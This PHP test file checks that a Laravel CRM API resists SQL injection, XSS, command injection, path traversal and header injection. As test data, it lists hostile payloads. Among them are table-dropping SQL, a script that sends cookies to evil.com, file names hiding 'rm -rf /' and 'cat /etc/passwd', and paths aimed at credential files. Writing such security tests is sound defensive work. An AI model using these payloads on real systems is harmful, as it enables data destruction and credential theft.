<?php

declare(strict_types=1);

namespace Tests\Feature\Security;

use Domain\Auth\Models\AuthPermission;
use Domain\Auth\Models\AuthUser;
use Domain\CRM\Models\CRMContact;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Laravel\Sanctum\Sanctum;

describe('SQL Injection Protection', function (): void {
    beforeEach(function (): void {
        $this->user = AuthUser::factory()->create([
            'password' => Hash::make('password'),
        ]);

        $permissions = ['crm.contacts.view', 'crm.contacts.create', 'crm.contacts.update', 'chat.tickets.view'];
        foreach ($permissions as $permission) {
            $perm = AuthPermission::query()->firstOrCreate(
                ['name' => $permission, 'guard_name' => 'sanctum'],
                ['id' => Str::orderedUuid()]
            );
            $this->user->givePermissionTo($perm);
        }

        Sanctum::actingAs($this->user);
    });

    it('rejects SQL injection in search parameters', function (): void {
        // Create some contacts
        CRMContact::factory()->count(3)->create(['tenant_id' => $this->user->tenant_id]);

        // Attempt SQL injection via search parameter
        $sqlInjectionPayloads = [
            "'; DROP TABLE crm_contacts; --",
            "1' OR '1'='1",
            '1; SELECT * FROM auth_users; --',
            "' UNION SELECT * FROM auth_users --",
            "1' AND 1=1 --",
            "admin'--",
            "' OR 1=1#",
            "'; INSERT INTO auth_users VALUES('hacker'); --",
        ];

        foreach ($sqlInjectionPayloads as $payload) {
            $response = $this->getJson('/api/crm/contacts?search='.urlencode($payload));

            // Should not cause a 500 error (which would indicate SQL syntax error)
            expect($response->status())->not->toBe(500);

            // Response should be valid JSON (no database error leaks)
            $response->assertJsonStructure(['data']);
        }
    });

    it('escapes SQL special characters in model creation', function (): void {
        $maliciousName = "Robert'); DROP TABLE crm_contacts; --";

        $response = $this->postJson('/api/crm/contacts', [
            'name' => $maliciousName,
            'email' => 'test@example.com',
            'phone' => '11999999999',
        ]);

        // Should succeed and properly escape the data
        $response->assertSuccessful();

        // Verify the data was stored literally (escaped), not executed
        $contact = \Domain\CRM\Models\CRMContact::query()->where('email', 'test@example.com')->first();
        expect($contact)->not->toBeNull();
        expect($contact->name)->toBe($maliciousName);

        // Verify table still exists
        expect(DB::getSchemaBuilder()->hasTable('crm_contacts'))->toBeTrue();
    });

    it('prevents SQL injection in order by parameters', function (): void {
        CRMContact::factory()->count(3)->create(['tenant_id' => $this->user->tenant_id]);

        $injectionPayloads = [
            'name; DROP TABLE crm_contacts; --',
            'name UNION SELECT * FROM auth_users',
            '(SELECT password FROM auth_users LIMIT 1)',
        ];

        foreach ($injectionPayloads as $payload) {
            $response = $this->getJson('/api/crm/contacts?sort='.urlencode($payload));

            // Should not cause server error
            expect($response->status())->not->toBe(500);

            // Should either ignore invalid sort or return validation error
            expect(in_array($response->status(), [200, 422], true))->toBeTrue();
        }
    });

    it('sanitizes filter parameters with special SQL characters', function (): void {
        CRMContact::factory()->create([
            'tenant_id' => $this->user->tenant_id,
            'name' => 'John Doe',
        ]);

        // Test various SQL metacharacters in filters
        $response = $this->getJson('/api/crm/contacts?filter[name]='.urlencode("' OR '1'='1"));

        $response->assertSuccessful();
        // Should return empty results (not all contacts due to injection)
        expect($response->json('data'))->toBeArray();
    });
});

describe('XSS Protection', function (): void {
    beforeEach(function (): void {
        $this->user = AuthUser::factory()->create([
            'password' => Hash::make('password'),
        ]);

        $permissions = ['crm.contacts.view', 'crm.contacts.create', 'crm.contacts.update'];
        foreach ($permissions as $permission) {
            $perm = AuthPermission::query()->firstOrCreate(
                ['name' => $permission, 'guard_name' => 'sanctum'],
                ['id' => Str::orderedUuid()]
            );
            $this->user->givePermissionTo($perm);
        }

        Sanctum::actingAs($this->user);
    });

    it('XSS payloads are safely handled in JSON responses', function (): void {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert("XSS")>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
        ];

        foreach ($xssPayloads as $index => $payload) {
            $email = "test{$index}@example.com";
            $response = $this->postJson('/api/crm/contacts', [
                'name' => $payload,
                'email' => $email,
                'phone' => '11999999999',
            ]);

            // If accepted, the JSON Content-Type prevents browser XSS execution
            if ($response->status() === 200 || $response->status() === 201) {
                // JSON responses are safe from XSS as browsers don't execute scripts in JSON
                $response->assertHeader('Content-Type', 'application/json');

                // Clean up
                \Domain\CRM\Models\CRMContact::query()->where('email', $email)->delete();
            }
        }
    });

    it('escapes HTML entities in API responses', function (): void {
        $htmlContent = '<script>alert("test")</script>';

        $contact = CRMContact::factory()->create([
            'tenant_id' => $this->user->tenant_id,
            'name' => $htmlContent,
        ]);

        $response = $this->getJson("/api/crm/contacts/{$contact->id}");
        $response->assertSuccessful();

        // Response should be JSON (Content-Type prevents browser from rendering HTML)
        $response->assertHeader('Content-Type', 'application/json');
    });

    it('prevents stored XSS via notes or descriptions', function (): void {
        $contact = CRMContact::factory()->create([
            'tenant_id' => $this->user->tenant_id,
        ]);

        $xssNote = '<img src="x" onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">';

        $response = $this->patchJson("/api/crm/contacts/{$contact->id}", [
            'notes' => $xssNote,
        ]);

        // Should be accepted (stored) but the output format (JSON) prevents execution
        if ($response->status() === 200) {
            $response->assertHeader('Content-Type', 'application/json');
        }
    });
});

describe('Command Injection Protection', function (): void {
    beforeEach(function (): void {
        $this->user = AuthUser::factory()->create([
            'password' => Hash::make('password'),
        ]);

        $permissions = ['crm.contacts.view', 'crm.contacts.create'];
        foreach ($permissions as $permission) {
            $perm = AuthPermission::query()->firstOrCreate(
                ['name' => $permission, 'guard_name' => 'sanctum'],
                ['id' => Str::orderedUuid()]
            );
            $this->user->givePermissionTo($perm);
        }

        Sanctum::actingAs($this->user);
    });

    it('validates filename sanitization patterns', function (): void {
        $commandInjectionPayloads = [
            'file.jpg; rm -rf /',
            'file.jpg`whoami`',
            'file.jpg$(cat /etc/passwd)',
            'file.jpg | cat /etc/passwd',
            'file.jpg && id',
        ];

        foreach ($commandInjectionPayloads as $payload) {
            // Verify that the payload contains dangerous characters (test the test data)
            expect(preg_match('/[;&|`$]/', $payload))->toBe(1);

            // A properly sanitized filename should not contain these characters
            $sanitized = preg_replace('/[^a-zA-Z0-9._-]/', '_', $payload);
            expect(preg_match('/[;&|`$]/', $sanitized))->toBe(0);
        }
    });

    it('prevents command injection via CNPJ lookup', function (): void {
        $maliciousCnpj = '12345678000195; cat /etc/passwd';

        $response = $this->getJson('/api/cnpj/'.urlencode($maliciousCnpj));

        // Should return validation error, not execute command
        expect($response->status())->not->toBe(500);
        expect(in_array($response->status(), [404, 422, 400], true))->toBeTrue();
    });

    it('sanitizes shell metacharacters in export filenames', function (): void {
        $dangerousFilename = 'report$(id).csv';

        // The application should sanitize filenames before any shell operations
        $sanitized = preg_replace('/[^a-zA-Z0-9._-]/', '_', $dangerousFilename);

        expect($sanitized)->not->toContain('$(');
        expect($sanitized)->not->toContain('`');
        expect($sanitized)->toBe('report__id_.csv');
    });

    it('prevents path traversal in file operations', function (): void {
        $pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ];

        foreach ($pathTraversalPayloads as $payload) {
            // Test that path is normalized and blocked
            $normalizedPath = realpath($payload);

            // realpath returns false for non-existent paths
            // The application should validate paths stay within allowed directories
            expect($normalizedPath === false || ! str_starts_with($normalizedPath, '/etc'))->toBeTrue();
        }
    });
});

describe('Header Injection Protection', function (): void {
    beforeEach(function (): void {
        $this->user = AuthUser::factory()->create([
            'password' => Hash::make('password'),
        ]);
        Sanctum::actingAs($this->user);
    });

    it('prevents CRLF injection in redirect parameters', function (): void {
        $crlfPayloads = [
            "https://example.com\r\nSet-Cookie: hacked=true",
            'https://example.com%0d%0aSet-Cookie: hacked=true',
            "https://example.com\nX-Injected: true",
        ];

        foreach ($crlfPayloads as $payload) {
            // Framework should prevent CRLF in headers
            $response = $this->getJson('/api/auth/me');

            // Verify no injected headers
            expect($response->headers->has('X-Injected'))->toBeFalse();

            // Set-Cookie may be null, so check it doesn't contain 'hacked' if present
            $cookies = $response->headers->get('Set-Cookie');
            if ($cookies !== null) {
                expect($cookies)->not->toContain('hacked');
            }
        }
    });

    it('sanitizes user input in log messages', function (): void {
        // Attempt log injection
        $logInjectionPayload = "normal data\n[ERROR] Fake error message\nMore fake logs";

        $response = $this->postJson('/api/auth/login', [
            'email' => $logInjectionPayload,
            'password' => 'password',
        ]);

        // Should fail validation (invalid email format)
        $response->assertStatus(422);
    });
});
